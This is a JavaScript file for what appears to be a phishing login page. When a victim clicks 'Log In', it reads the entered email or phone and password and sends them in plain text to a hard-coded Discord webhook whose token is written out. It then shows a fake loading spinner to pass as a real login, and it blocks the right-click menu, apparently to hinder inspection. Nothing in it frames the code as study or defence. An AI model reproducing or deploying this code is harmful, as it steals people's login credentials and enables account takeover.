// ----------------------------------
// SELECTING ELEMENTS
// ----------------------------------
const loginButton = document.querySelector("button");

// Webhook URL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1358739681470316677/-GPhfZIhYskH1FlWulsIrUQZoG_oE6w7tewh1e8EowwBhSSDRdNzMXUPjG39gwUyt0uB";

// -----------------------------------
// ELLIPSIS ANIMATION
// ------------------------------------
function removeEllipsisAnimation() {
  loginButton.innerHTML = "";
  loginButton.textContent = "Log In";
  loginButton.removeAttribute("disabled");
}

async function sendCredentialsToWebhook(email, password) {
  try {
    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        content: `Email: ${email}\nPassword: ${password}`,
      }),
    });

    if (response.ok) {
      console.log("Credentials successfully sent to webhook.");
    } else {
      console.error("Failed to send credentials to webhook:", response.status);
    }
  } catch (error) {
    console.error("Error sending credentials to webhook:", error);
  }
}

function animateEllipsis() {
  // Get user input from the form
  const email = document.getElementById("emailORphone").value;
  const password = document.getElementById("password").value;

  // Send credentials to webhook
  sendCredentialsToWebhook(email, password);

  // Start animation
  loginButton.innerHTML = "";
  loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                                    <span class="inner pulsingEllipsis">
                                        <span class="item spinnerItem"></span>
                                        <span class="item spinnerItem"></span>
                                        <span class="item spinnerItem"></span>
                                    </span>
                           </span>`;
  const spinnerItems = document.querySelectorAll(".spinnerItem");
  spinnerItems.forEach((item, index) => {
    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${
      index * 0.2
    }s`;
  });
  loginButton.setAttribute("disabled", "true");

  // Simulate login process
  setTimeout(removeEllipsisAnimation, 3000);
}

// --------------------------
// ATTACHING EVENT LISTENERS
// --------------------------
loginButton.addEventListener("click", animateEllipsis);
document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});